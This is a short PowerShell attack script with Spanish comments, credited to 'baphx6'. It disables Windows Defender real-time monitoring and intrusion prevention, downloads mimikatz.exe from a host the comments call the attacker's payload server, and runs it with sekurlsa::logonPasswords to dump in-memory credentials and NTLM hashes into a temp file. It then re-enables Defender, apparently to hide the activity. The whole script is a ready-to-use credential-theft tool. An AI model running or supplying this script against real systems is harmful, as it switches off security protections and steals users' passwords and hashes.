# Author : baphx6
# Desactivar Windows Defender
Set-MpPreference -DisableIntrusionPreventionSystem $true -Force
Set-MpPreference -DisableRealtimeMonitoring $true -Force

Write-Output "Antivirus desactivado"

# URL del servidor de payloads atacante donde se aloja Mimikatz.exe
$url = "http://192.168.122.217/mimikatz.exe"
# Ruta para guardar el archivo
$file = "C:\Windows\Temp\mimikatz.exe"
# Ruta para guardar el output de Mimikatz
$output = "C:\Windows\Temp\mimikatz-output.txt"

# Descarga de Mimikatz.exe desde el servidor atacante
Write-Output "Descargando Mimikatz ..."
Invoke-WebRequest -Uri $url -OutFile $file

# Ejecución de Mimikatz.exe para extraer los hashes NTLM de los usuarios
Write-Output "Extrayendo credenciales en memoria ..."
Start-Process $file -ArgumentList "privilege::debug", "sekurlsa::logonPasswords", "exit" -NoNewWindow -Wait -RedirectStandardOutput $output

Write-Output "Extracción completada. Resultados en $output"

# Reactivar Windows Defender
Set-MpPreference -DisableIntrusionPreventionSystem $false -Force
Set-MpPreference -DisableRealtimeMonitoring $false -Force
Write-Output "Antivirus re-activado"
